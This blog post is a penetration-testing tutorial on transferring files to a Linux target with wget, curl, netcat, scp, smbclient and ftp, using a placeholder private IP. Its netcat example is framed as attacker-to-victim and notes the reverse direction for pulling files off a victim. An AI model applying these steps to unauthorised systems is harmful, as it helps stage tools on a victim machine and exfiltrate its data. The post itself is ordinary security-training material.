---
title: "Transfer Files To A Linux Machine"
layout: single
read_time: true
comments: true
share: true
author_profile: true
header:
  overlay_color: "#000"
  overlay_filter: "0.5"
  overlay_image: /assets/christopher-burns-Kj2SaNHG-hg-unsplash.jpg
excerpt: "<br><br><br>"
categories:
  - tutorial
tags:
  - cybersecurity
  - penetration testing
---

This section is pulling from my online notes [here](https://calvin-connor.gitbook.io/hacking-notes/general/transferring-files/transferring-files-to-linux), or at https://calvin-connor.gitbook.io/hacking-notes/.

## Overview

During an engagement, you may find certain tools do not exist, outbound ports have been blocked, and sometimes, the machine is just too buggy to transfer your files the only way you know how. For this reason, I find it helpful to have an array of tools at my disposal. I would recommend practicing all the below examples until you know every way you can transfer a file in your specific scenario.

## Wget

```
wget 192.168.1.1:80/example.txt
```

A Linux command-line tool that you can find on most machines you will encounter. Use in conjunction with an HTTP file server in the previous section.

## Curl

```
curl -O http://192.168.1.1:80/example.txt
```

If not told otherwise, curl writes the received data to stdout. It can be instructed to instead save that data into a local file, using the -o, --output or -O, --remote-name options. Use in conjunction with an HTTP file server in the previous section.

## Netcat

```
nc -lvp 5555 > example.txt    //Attacker Machine

nc 192.168.1.1 5555 < example.txt    //Victim Machine
```

This is one of the rare instances where I include how to host the file as well, since Netcat is such a diverse tool and not just for file transfers. The way I remember the direction of arrows is first we need to send > the file and then receive < it. This tool is especially excellent in that you can reverse the order and download a file from the victim instead.

## SSH

```
scp example.txt username@192.168.1.1:/tmp
```

This is more niche as it obviously relies on having SSH credentials. If you are using something like an id_rsa file instead, reflect those changes but keep the scp and :/tmp. The : is not an error here, I have forgotten it too many times. /tmp is whatever directory on the victim you want to transfer the file to.

## SMB

```
smbclient //192.168.1.1/share -U username
smb: \> get example.txt
smb: \> exit
```

Even if no password is set for the SMB share, you will still have to press enter upon the password prompt. /share references the share name and is not a default share name, but I usually name my SMB shares “share” for this reason. smb \> represents once you have connected to the share and is not a part of the command that you need to run. Refer to the previous section on starting an SMB share.

## FTP

```
ftp 192.168.1.1
```

After you are entered the connect command, it will prompt you for both the username and password you want to enter. Even if you are connecting anonymously, you will still have to enter the anonymous:anonymous credentials. From there, you can navigate the file share like a normal directory. Always use the help command if you are unsure of how to download or upload files.

```
ftp://192.168.1.1
```

You can also access FTP on any browser by appending ftp:// before the address. You will still be prompted for credentials.
